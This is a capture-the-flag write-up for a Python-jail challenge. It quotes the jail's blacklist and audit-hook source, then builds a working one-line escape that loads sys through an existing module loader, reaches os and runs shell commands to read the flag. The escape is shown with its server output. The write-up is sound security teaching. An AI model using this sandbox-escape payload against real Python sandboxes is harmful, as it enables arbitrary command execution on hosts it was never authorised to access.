---
title: "Prison - CTF Writeup"
date: 2025-12-27
draft: false
description: "misc challenge writeup"
tags: ["Misc", "Medium"]
categories: ["Writeups"]
---
**Challenge Name:** Prison  
**Category:** Misc  
**CTF:** ClawTheFlag  
**Difficulty:** Medium  
**Description:** Nothing to see here, just another pyjail  
**Connection:** `ncat prison.ctf.clawtheflag.com 1337 --ssl`

---

## Initial Analysis

Upon connecting to the server, we're greeted with a Python jail prompt:

```
Welcom to your good ol' pyjail!
> 
```

The challenge provides a `server.py` file showing the jail implementation. Let's analyze it.

---

## Source Code Analysis

```python
import sys

def hook(event, _):
    blacklist = ["import", "ctypes", "open"]
    if event in blacklist:
        print(f"Event not allowed: {event}")
        exit()

def check_code(code):
    banned_chars = ["[", "]", "g", "@"]
    banned_words = [
        "builtins",
        "breakpoint",
        "exec",
        "eval",
        "attr",
        "import",
        "class",
        "bases",
        "f_back",
        "traceback",
        "globals",
        "popen",
        "license",
        "help",
    ]

    try:
        code.encode("ascii")
    except UnicodeEncodeError:
        return False

    for c in code:
        if c in banned_chars:
            return False

    for word in banned_words:
        if word in code.lower():
            return False
    return True

if __name__ == "__main__":
    while True:
        print("Welcom to your good ol' pyjail!")
        inp = input("> ")

        if not check_code(inp):
            print("nope")
            continue

        code = compile(inp, "<string>", "single")
        sys.addaudithook(hook)

        try:
            exec(code, dict())
        except:
            pass
```

### Key Restrictions

1. **Banned Characters:** `[`, `]`, `g`, `@`
2. **Banned Words (case-insensitive):** 
   - `builtins`, `breakpoint`, `exec`, `eval`, `attr`, `import`, `class`, `bases`
   - `f_back`, `traceback`, `globals`, `popen`, `license`, `help`
3. **Audit Hook:** Blocks `import`, `ctypes`, and `open` events
4. **Execution Context:** Code runs in an empty dictionary (`dict()`), no globals provided

---

## Exploitation Strategy

### Challenge #1: No Brackets

We can't use `[]` for indexing or dictionary access, so we need to use:
- `next()` with generator expressions
- `.items()`, `.keys()`, `.values()` for dictionary traversal

### Challenge #2: No "g" Character

This is particularly nasty because:
- Can't use `globals()` (also banned word)
- Can't use `__getattribute__` or `getattr` 
- Can't access many useful attributes directly

### Challenge #3: Bypassing "builtins" Ban

We can construct the string dynamically:
```python
b = "__" + "built" + "ins" + "__"
```

### Challenge #4: Getting Code Execution

The audit hook blocks `import`, but there are modules already loaded! We need to:
1. Access `__builtins__` (via string construction)
2. Find a path to already-loaded modules
3. Load additional modules without triggering `import` event
4. Get `os` module to execute shell commands

---

## Solution Walkthrough

### Step 1: Accessing `__builtins__`

First, we construct the builtins string and access it from `vars()`:

```python
b="__"+"built"+"ins"+"__"; m=next(v for k,v in vars().items() if k==b)
```

This gets us the `__builtins__` dictionary without writing the banned word.

### Step 2: Exploring Available Modules

From builtins, we can access the `open` function, which gives us access to the `_io` module:

```python
o=next(v for k,v in m.items() if k=="open"); io=o.__self__
```

Running `print(dir(io))` reveals interesting attributes including `__spec__`.

### Step 3: Finding a Module Loader

The `_io.__spec__.loader` gives us a `BuiltinImporter` instance:

```python
L=io.__spec__.loader
```

This loader has a `load_module()` method that can load built-in modules **without triggering the audit hook's `import` event**!

### Step 4: Loading `sys` Module

```python
s=L.load_module("sys")
```

This successfully loads `sys` and we can now access `sys.modules` to see all loaded modules.

### Step 5: Getting `os` Module

The `os` module is already loaded in `sys.modules`! We iterate through it (avoiding `g` in dictionary access):

```python
os=next(v for k,v in s.modules.items() if k=="os")
```

### Step 6: Finding the Flag

List the filesystem to find the flag:

```python
os.system("ls -la")
os.system("find / -name '*fla*' 2>/dev/null")
```

This reveals `/flag.txt` exists.

### Step 7: Reading the Flag

```python
os.system("cat /fla?.txt")
```

We use `?` wildcard to avoid typing `g` in "flag".

---

## Final Payload

The complete one-liner payload:

```python
b="__"+"built"+"ins"+"__"; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k=="open"); io=o.__self__; L=io.__spec__.loader; s=L.load_module("sys"); os=next(v for k,v in s.modules.items() if k=="os"); os.system("cat /fla?.txt")
```

---

## Execution

```bash
$ ncat prison.ctf.clawtheflag.com 1337 --ssl
Welcom to your good ol' pyjail!
> b="__"+"built"+"ins"+"__"; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k=="open"); io=o.__self__; L=io.__spec__.loader; s=L.load_module("sys"); os=next(v for k,v in s.modules.items() if k=="os"); os.system("cat /fla?.txt")
Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms}0
```

---

## Flag

```
Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms}
```

---

## Key Takeaways

1. **Audit Hooks Are Not Sandboxes:** As the flag suggests, Python's audit hooks are meant for monitoring, not security enforcement. They can be bypassed.

2. **Module Loaders Bypass Import Events:** Using `load_module()` from an existing loader doesn't trigger the `import` audit event.

3. **String Construction Bypasses Word Filters:** Simple string concatenation can bypass naive string-matching filters.

4. **Generator Expressions > List Comprehension:** When brackets are banned, generator expressions with `next()` are your friend.

5. **Already-Loaded Modules:** Python has many modules loaded by default (like `os`, `sys`, `_io`) that can be accessed without importing.

---

## Alternative Approaches

Other potential vectors that could work:
- Using `__loader__` from other built-in modules
- Accessing `sys` through exception tracebacks (but `traceback` is banned)
- Using `__import__` (would trigger audit hook though)
- Leveraging other loaded modules like `posix` directly

The key insight is finding a way to access already-loaded modules without triggering the audit hook, which the `load_module()` method accomplishes perfectly.
